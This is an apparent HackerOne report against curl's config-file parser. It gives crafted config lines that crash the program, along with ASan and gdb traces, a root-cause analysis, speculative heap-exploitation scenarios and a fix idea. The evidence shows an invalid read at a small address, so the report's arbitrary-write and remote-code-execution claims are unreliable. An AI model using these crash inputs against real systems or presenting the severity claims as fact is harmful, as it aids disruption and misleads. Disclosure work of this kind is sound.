# Heap‑based buffer overflow in curl -K <config_file> allows arbitrary write .

## Report Details
- **Report ID**: 3094406
- **URL**: https://hackerone.com/reports/3094406
- **State**: Closed
- **Severity**: high
- **Submitted**: 2025-04-15T14:39:03.280Z
- **Disclosed**: 2025-04-27T16:00:11.228Z

## Reporter
- **Username**: bsr13
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: curl

## Vulnerability Information
## Summary:
  A heap‑based buffer overflow in curl’s config‑file parser (`parseconfig()` --> `getparameter()`) allows an attacker supplying a crafted config file to overwrite internal pointers (via `cleanarg()`), leading to a write‑what‑where primitive and potential remote code execution.


## Affected version
  -curl 8.13.0 (x86_64-pc-linux-gnu) libcurl/8.13.0 OpenSSL/3.0.13 libpsl/0.21.2
    Release-Date: 2025-04-02

  - or any Version after  version 8.13.0 (dev-versions) that include `cleanarg()` and have writable argv support



## Steps To Reproduce:
 - tested on both Ubuntu 24.04.1 [Linux bobo-pc-1701 6.11.0-21-generic #21~24.04.1-Ubuntu ] AND 
                  Kali 6.11.2-1kali1 [Linux kali 6.11.2-amd64]  

  1. Download the last release from github and unizp it: 
    wget https://github.com/curl/curl/releases/download/curl-8_13_0/curl-8.13.0.zip && unzip curl-8.13.0.zip && cd curl-8.13.0

  2. Build and install: 
    ./configure --with-openssl
     make all && sudo make install 
     curl --version

  3.  -The crash could be caused by crafted config file that contains one of this payloads;
       -> It could be appended anywhere in new line in config-file;
       -> All the inputs lead to one crash path.
 
            echo -ne "-vvvuAAAA" > malicious_config_file1.conf     (u for --user <user:password> )
            echo -ne "-vvvUAAAA" > malicious_config_file2.conf     (U for --proxy-user <user:password> )
            echo -ne "-vvvEAAAA" > malicious_config_file3.conf     (E for --cert <certificate[:password]> )

  
  4. 
       curl -K malicious_config_file1.conf  
       zsh: segmentation fault  curl -K malicious_config_file1.conf
     ---------------- Or ------------------
     curl -K malicious_config_file2.conf 
        zsh: segmentation fault  curl -K malicious_config_file2.conf
      ---------------- Or ------------------
     curl -K malicious_config_file3.conf 
        zsh: segmentation fault  curl -K malicious_config_file3.conf
 
  >> sudo dmesg |tail -n 6

        [176771.791272] curl[132987]: segfault at 5 ip 00007f3a8db8b75d sp 00007ffd419fd958 error 4 in libc.so.6[18b75d,7f3a8da28000+188000] likely on CPU 3 (core 3, socket 0)
        [176771.791357] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66

        [176778.655937] curl[132996]: segfault at 5 ip 0000792ad5f8b75d sp 00007fff028cfc18 error 4 in libc.so.6[18b75d,792ad5e28000+188000] likely on CPU 6 (core 2, socket 1)
        [176778.656011] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66

        [176783.987409] curl[133003]: segfault at 5 ip 000079c33cd8b75d sp 00007ffe06464158 error 4 in libc.so.6[18b75d,79c33cc28000+188000] likely on CPU 0 (core 0, socket 0)
        [176783.987474] Code: 00 00 66 2e 0f 1f 84 00 00 00 00 00 90 f3 0f 1e fa 89 f8 48 89 fa c5 f9 ef c0 25 ff 0f 00 00 3d e0 0f 00 00 0f 87 33 01 00 00 <c5> fd 74 0f c5 fd d7 c1 85 c0 74 57 f3 0f bc c0 c5 f8 77 c3 66 66


## Triaging the crash: 
 1.To triage this we need to build with extra flags:  

    >> CFLAGS="-fsanitize=address,undefined -g -O0 -fno-omit-frame-pointer" ./configure --with-openssl    
    >> make all && sudo make install 

  2.Run curl : 
    ------------------------------------- Asan output ----------------------------------
    pc@pc22:~/Downloads$ curl -K malicious_config_file1.conf 
    AddressSanitizer:DEADLYSIGNAL
    ------------------------------------------------------------------------------------
          ==140300==ERROR: AddressSanitizer: SEGV on unknown address 0x000000000005 (pc 0x72133b58b75d bp 0x7ffe1b2c0b20 sp 0x7ffe1b2c02a8 T0)
          ==140300==The signal is caused by a READ memory access.
          ==140300==Hint: address points to the zero page.
              #0 0x72133b58b75d in __strlen_avx2 ../sysdeps/x86_64/multiarch/strlen-avx2.S:76
              #1 0x63e45d7996dc in cleanarg /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:583
              #2 0x63e45d7b2d19 in getparameter /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:2901
              #3 0x63e45d7b1ad8 in getparameter /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:2790
              #4 0x63e45d7b4205 in parse_args /home/bobo/Downloads/curl-8.13.0/src/tool_getparam.c:3016
              #5 0x63e45d7b76ba in main /home/bobo/Downloads/curl-8.13.0/src/tool_main.c:284

      AddressSanitizer can not provide additional info.
      SUMMARY: AddressSanitizer: SEGV ../sysdeps/x86_64/multiarch/strlen-avx2.S:76 in __strlen_avx2
      ==140300==ABORTING

  - We can Also confirm the crash path using gdb (with GEF extension installed ):
    >> gdb curl 
    (gef)> r -K malicious_config_file1.conf
    (gef)> where 
    --------------------------------- gdb output ------------------------------------------------------
      #0  __strlen_avx2 () at ../sysdeps/x86_64/multiarch/strlen-avx2.S:76
      #1  0x00007ffff787d827 in ___interceptor_strlen (s=0x5 <error: Cannot access memory at address 0x5>) at ../../../../src/libsanitizer/sanitizer_common/sanitizer_common_interceptors.inc:389
      #2  0x00005555555926dd in cleanarg (str=0x5 <error: Cannot access memory at address 0x5>) at tool_getparam.c:583
      #3  0x00005555555abd1a in getparameter (flag=0x50300000f281 "vvvuAAAA", nextarg=0x50300000f285 "AAAA", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, 
          config=0x51a000000080) at tool_getparam.c:2901
      #4  0x00005555555b9434 in parseconfig ()
      #5  0x00005555555aaad9 in getparameter (flag=0x7fffffffe1b8 "K", nextarg=0x7fffffffe1ba "malicious_config_file1.conf", cleararg1=0x7fffffffe1b7 "-K", 
          cleararg2=0x7fffffffe1ba "malicious_config_file1.conf", usedarg=0x7ffff4200030, global=0x7ffff4300030, config=0x51a000000080) at tool_getparam.c:2790
      #6  0x00005555555ad206 in parse_args (global=0x7ffff4300030, argc=0x3, argv=0x7fffffffde48) at tool_getparam.c:3016
      #7  0x00005555555b6a45 in operate ()
      #8  0x00005555555b06bb in main (argc=0x3, argv=0x7fffffffde48) at tool_main.c:284
  --------------------------------- Code ----------------------------------------------------------------------
          0x7ffff678b74d <__strlen_avx2+000d> and    eax, 0xfff
          0x7ffff678b752 <__strlen_avx2+0012> cmp    eax, 0xfe0
          0x7ffff678b757 <__strlen_avx2+0017> ja     0x7ffff678b890 <__strlen_avx2+336>
        → 0x7ffff678b75d <__strlen_avx2+001d> vpcmpeqb ymm1, ymm0, YMMWORD PTR [rdi]         // $rdi = 0x5 so unvalid address 
          0x7ffff678b761 <__strlen_avx2+0021> vpmovmskb eax, ymm1
          0x7ffff678b765 <__strlen_avx2+0025> test   eax, eax
          0x7ffff678b767 <__strlen_avx2+0027> je     0x7ffff678b7c0 <__strlen_avx2+128>
          0x7ffff678b769 <__strlen_avx2+0029> tzcnt  eax, eax
          0x7ffff678b76d <__strlen_avx2+002d> vzeroupper 
  -------------------------------------------------------------------------------------------------------------
    - From the above output we can see that: 
     1.the root cause of the crash is that strlen tried to load the data at invalid address (0x5), So it’s an invalid pointer dereference into unmapped memory.
    
     2. --------
     #2  0x00005555555926dd in cleanarg (str=0x5 <error: Cannot access memory at address 0x5>) at tool_getparam.c:583
     #3  0x00005555555abd1a in getparameter (flag=0x50300000f281 "vvvuAAAA", nextarg=0x50300000f285 "AAAA", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, 
        config=0x51a000000080) at tool_getparam.c:2901

     Moreever, we can see that the crash happened in `getparameter()` function tool_getparam.c:2901, which calls `cleanarg(clearthis)` with invalid address which passed to strlen.  

     3. In order to understand where is the invalid address come from , I set a breakpoint in gdb just before `cleanarg(clearthis)` in tool_getparam.c:2901 and tool_getparam.c:2900 ( - Not that for other options like --proxy-user [U] or --cert(E) you have to set breakpoints at different lines in tool_getparam.c )

       see:   https://github.com/curl/curl/blob/master/src/tool_getparam.c#L2898-L2902
        
```
2898     case C_USER: /* --user */
2899       /* user:password  */
2900       err = getstr(&config->userpwd, nextarg, ALLOW_BLANK); //------set break point here  ----
2901       cleanarg(clearthis);                                  //--------- set break point here  --------       
2902       break;

```
 
        >> gdb curl 
        (gef)> break tool_getparam.c:2900
        (gef)> break tool_getparam.c:2901
        (gef)> r -K malicious_config_file1.conf

              ──────────────────────source:tool_getparam.c+2900 ───────────────
```
2895	     case C_UPLOAD_FILE: /* --upload-file */
2896	       err = parse_upload_file(config, nextarg);
2897	       break;
2898	     case C_USER: /* --user */
2899	       /* user:password  */
// nextarg=0x00007fffffffd5a0  →  [...]  →  0xbebebe0041414141 ("AAAA"?), config=0x00007fffffffd578  →  [...]  →  0x0000000000000000
●-> 2900	       err = getstr(&config->userpwd, nextarg, ALLOW_BLANK);
●  2901	       cleanarg(clearthis);
2902	       break;
2903	     case C_PROXY_USER: /* --proxy-user */
2904	       /* Proxy user:password  */
2905	       err = getstr(&config->proxyuserpwd, nextarg, ALLOW_BLANK);
```           
             ────────────── threads ─────────────
              [#0] Id 1, Name: "curl", stopped 0x5555555abc83 in getparameter (), reason: BREAKPOINT
              ────────────── trace ──────────────
              [#0] 0x5555555abc83 → getparameter(flag=0x50300000f281 "vvvuAAAA", nextarg=0x50300000f285 "AAAA", cleararg1=0x0, cleararg2=0x0, usedarg=0x7fffffffd79e, global=0x7ffff4300030, config=0x51a000000080)
              [#1] 0x5555555b9434 → parseconfig()
              [#2] 0x5555555aaad9 → getparameter(flag=0x7fffffffe1b9 "K", nextarg=0x7fffffffe1bb "malicious_config_file1.conf", cleararg1=0x7fffffffe1b8 "-K", cleararg2=0x7fffffffe1bb "malicious_config_file1.conf", usedarg=0x7ffff4200030, global=0x7ffff4300030, config=0x51a000000080)
              [#3] 0x5555555ad206 → parse_args(global=0x7ffff4300030, argc=0x3, argv=0x7fffffffde48)
              [#4] 0x5555555b6a45 → operate()
              [#5] 0x5555555b06bb → main(argc=0x3, argv=0x7fffffffde48)
              ──────────────────────────────────────────────────────────────
            
              (gef)> p clearthis 
                   $1 = 0x5 <error: Cannot access memory at address 0x5>
              


             -> We hit at the first breakpoint and we confirmed that the clearthis value has been modified (invalid address)
             -> then we verified where the variable clearthis could be modified in the code (tool_getparam.c)
           
               See:   https://github.com/curl/curl/blob/master/src/tool_getparam.c#L1787-L1798
 ```
1787   #ifdef HAVE_WRITABLE_ARGV
1788           clearthis = &cleararg1[parse + 2 - flag];
1789   #endif
1790         }
1791         else if(!nextarg) {
1792           err = PARAM_REQUIRES_PARAMETER;
1793           break;
1794         }
1795         else {
1796   #ifdef HAVE_WRITABLE_ARGV
1797           clearthis = cleararg2;
1798   #endif
```
             
            -> Now we know that if the palfrom supports writable argv[], the clearthis is calculated with the following expression
                                
                                ---> Clearthis = &cleararg1[parse + 2 - flag];     

                  (gef)>  p &parse
                     $12 = (const char **) 0x7fffffffd5c0
                  (gef)> p parse
                     $13 = 0x50300000f284 "uAAAA"
                  ------------------------- 
                  (gef)> p &flag 
                      $14 = (const char **) 0x7fffffffd5a8
                  (gef)> p flag
                    $15 = 0x50300000f281 "vvvuAAAA"
                  -------------------------
                  (gef)> p &cleararg1
                    $16 = (char **) 0x7fffffffd598
                  (gef) = p cleararg1
                    $17 = 0x0
                  -------------------------
                  (gef)> p parse+2-flag     
                    $17 = 0x5             // 0x50300000f284 +2 - 0x50300000f281

              -> From the above output we can see that the value of clearthis is: (2 +  the number of "v" letters [in our example ] = 0x5 ), which means that an attacker could partially control the what's written in [rdi] register which may lead to arbitrary read/write or code execution.
            
      ## Fix suggestions: 
         I'm not entirely sure this is the ideal fix since I'm not an expert in C programming, but here's the best approach I could come up with: 

        - Since we know exactly where clearthis is supposed to point (somewhere within the cleararg1 buffer), we can validate the pointer by ensuring it falls within the bounds of that buffer and points to a NUL-terminated string so we can safely use the pointer without risking out-of-bounds access or undefined behavior.


      ## Possible exploitation Scenarios: 
         - Chain multiple overwrites:  if an attacker managed to call cleanarg(), he might be able to accumulate a larger total write.

        - Achieving arbitrary code execution would be highly complex especially on x64 bit, However advanced exploitation techniques **such as partial pointer overwrites, feg shui or heap grooming (e.g., manipulating allocations to position attacker-controlled buffers adjacent to sensitive heap structures) ** could theoretically enable an attacker to overwrite function pointers and hijack control flow.
        
        - This also could leak heap contents (pointers or secrets)

        Note  that : ** the above attacks are more likely to occur in x86 bit architechure **


## Supporting Material/References:
  - CWE-122: Heap-based Buffer Overflow: https://cwe.mitre.org/data/definitions/122.html

## Impact

- Arbitrary Write: An attacker might achieve a write‑what‑where condition, which allow to modify arbitrary memory locations within the process’s address space.

- Potential Remote Code Execution: With advanced techniques (partial pointer overwrite, heap grooming, ...), the attacker could overwrite function pointers or return addresses, leading to full control of execution flow and the ability to run arbitrary code as the curl process.

- Information Disclosure: pointing clearthis at attacker-chosen addresses and calling strlen() can leak heap contents (such as pointers, secrets, or other sensitive data) by returning string lengths or causing controlled crashes.

## Attachments
No attachments
